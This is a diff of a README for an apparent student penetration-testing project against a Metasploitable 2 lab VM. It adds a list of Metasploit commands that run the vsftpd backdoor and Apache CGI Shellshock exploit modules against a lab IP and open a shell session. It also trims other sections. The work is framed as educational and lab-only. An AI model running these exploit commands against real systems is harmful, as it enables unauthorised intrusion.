@@ -16,28 +16,28 @@ To identify and exploit real-world vulnerabilities using professional penetratio
 
 ---
 
-## 📋 Steps Performed
+## 🎯 Objectives
 
-1. **Service Enumeration** (via Nmap & manual browsing)
-2. **Nikto Scan** of the target web server
-3. **Exploitation using Metasploit:**
-   - `exploit/unix/ftp/vsftpd_234_backdoor`
-   - `exploit/multi/http/php_cgi_arg_injection`
-   - `exploit/multi/http/apache_mod_cgi_bash_env_exec`
-4. **Obtained Shell Access** via Meterpreter
-5. **Privilege Escalation** attempt from `www-data` to `root`
+- Identify vulnerable services
+- Exploit known CVEs (Apache, FTP)
+- Obtain shell access
+- Attempt privilege escalation
 
----
+## 📝 Key Metasploit Commands
 
-## 📂 Files Included
+- use exploit/unix/ftp/vsftpd_234_backdoor
+- set RHOSTS 192.168.56.102
+- run
+- use exploit/multi/http/apache_mod_cgi_bash_env_exec
+- set RHOSTS 192.168.56.102
+- set TARGETURI /cgi-bin/test.cgi
+- set LHOST 192.168.56.101
+- run
+- sessions -i 1
+- whoami
+- id
 
-- `VAPT_Report.pdf`: Detailed step-by-step report
-- `nikto_scan.txt`: Raw Nikto scan output
-- `exploit_steps.md`: Manual breakdown of Metasploit module usage
-- `metasploit_commands.txt`: Commands used during the session
-- `/screenshots/`: Key visual proof of successful exploitation
 
----
 
 ## 📷 Screenshots
 
@@ -50,9 +50,9 @@ To identify and exploit real-world vulnerabilities using professional penetratio
 
 ---
 
-## 📄 Final Report
+## 📄 Report
 
-See the PDF report: [`VAPT_Report.pdf`](./VAPT_Report.pdf) for a full write-up of the engagement.
+PDF write-up coming soon...
 
 ---
 
@@ -60,13 +60,5 @@ See the PDF report: [`VAPT_Report.pdf`](./VAPT_Report.pdf) for a full write-up o
 
 > This project was performed in a **legal, controlled lab environment** using Metasploitable 2 for educational purposes only.  
 > Do not attempt these techniques on any system without **explicit permission**.
-
----
-
-## ⭐ Highlights
-
-- Discovered multiple critical web and FTP vulnerabilities
-- Gained low-privilege shell access on the target system
-- Demonstrated hands-on Metasploit usage for real-world attack chains
 
 ---
